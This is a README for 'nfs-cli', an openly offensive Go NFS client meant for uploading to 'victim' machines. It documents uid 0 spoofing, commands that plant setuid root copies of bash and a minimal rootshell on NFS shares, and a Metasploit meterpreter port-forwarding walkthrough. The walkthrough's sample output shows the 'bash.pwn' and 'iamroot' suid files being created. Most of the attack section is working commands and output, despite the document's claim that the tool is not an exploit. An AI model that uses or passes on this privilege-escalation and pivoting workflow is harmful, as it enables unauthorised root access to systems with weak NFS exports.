# nfs-cli

Simple cli for nfs. No NFS permissions are bypassed or anything. This is not an exploit. You can set machine identifier, uid and gid though.

Also, just in case the permissions aren't all that great there are some nice pwn features available.

(And no, this doesn't work through a metasploit socks proxy, as go doesn't obey proxychains.)

It really shines when built static and uploaded to a victim machine, or when we have direct access to a NFS share.

## Usage
```sh
nfs-cli <rhost> <path> -u 0:0
```
Use `-h` for help.

Build static (for infil):
```sh
CGO_ENABLED=0 go build -a -ldflags '-extldflags "-static"' .
```

Pretty sure you need to use the `-u` switch if you are running this in Windows. Can't really see that working.

### Commands
Note: Don't include slashes in paths, this tool is pretty dumb.

- `ls` - list files i cwd
- `cd newdir` - change cwd
- `mkdir newdir` - create a directory (mode `06777`)
- `rmdir dir` - delete directory (and recursive)

- `cat file` - view file
- `b64get file` - download file "visually" in base64 format
- `get file` - download file

- `put file` - upload file (mode `06777`)
- `b64put file` - will prompt for base64 input and upload (mode `06777`)
- `type file` - allows for manual file upload (mode `06777`)
- `rm file` - delete file

- `pwn file` - copies `file` to `file.pwn` and sets mode `06777`
- `shell file` - creates a minimal rootshell (if allowed)

The suid-bit doesn't work unless you are root, not sure if this is nfs or the library.

## Example
Metasploit:
```
# we can't forward listening sockets
sudo systemctl stop portmap
sudo systemctl stop rpcbind.socket

sudo msfconsole -q   # 111 is privileged, see below for workaround
...
meterpreter > shell
Process XYZ created.
Channel ZYX created.
$ rpcinfo
   program vers proto   port  service
   ...
    100005    2   tcp  20048  mountd      <--this is the portnumber you want
   ...
$ exit
meterpreter > portfwd add -l 111 -L 0.0.0.0 -p 111 -r 127.0.0.1
meterpreter > portfwd add -l 2049 -L 0.0.0.0 -p 2049 -r 127.0.0.1
meterpreter > portfwd add -l 20048 -L 0.0.0.0 -p 20048 -r 127.0.0.1
```

Client:
```
./nfs-cli -u 0:0 localhost /home/james
/home/james$ ls
       0     0     0        0 | Mon Jan  1 00:00:00 0001  [.]
       0     0     0        0 | Mon Jan  1 00:00:00 0001  [..]
     755  1000  1000  1183448 | Mon Jan  9 23:12:03 2023  [bash]
/home/james$ pwn bash
/home/james$ ls
       0     0     0        0 | Mon Jan  1 00:00:00 0001  [.]
       0     0     0        0 | Mon Jan  1 00:00:00 0001  [..]
     755  1000  1000  1183448 | Mon Jan  9 23:12:03 2023  [bash]
    6777     0     0  1183448 | Mon Jan  9 23:13:49 2023  [bash.pwn]
/home/james$ shell iamroot
/home/james$ ls
       0     0     0        0 | Mon Jan  1 00:00:00 0001  [.]
       0     0     0        0 | Mon Jan  1 00:00:00 0001  [..]
     755  1000  1000  1183448 | Mon Jan  9 23:12:03 2023  [bash]
    6777     0     0  1183448 | Mon Jan  9 23:13:49 2023  [bash.pwn]
    6777     0     0      163 | Mon Jan  9 23:14:25 2023  [iamroot]
```

## Alternative usage (non-priv)
```
git clone https://github.com/go-nfs/nfsv3.git
cd nfsv3
# copy the go files here
# edit nfs/rpc/portmap.go and change PmapPort to 9111
go run . -h
```

Now it's possible to `portfwd add -l 9111 -L 0.0.0.0 -p 111 -r 127.0.0.1` instead. No need to run `msfconsole` as root.
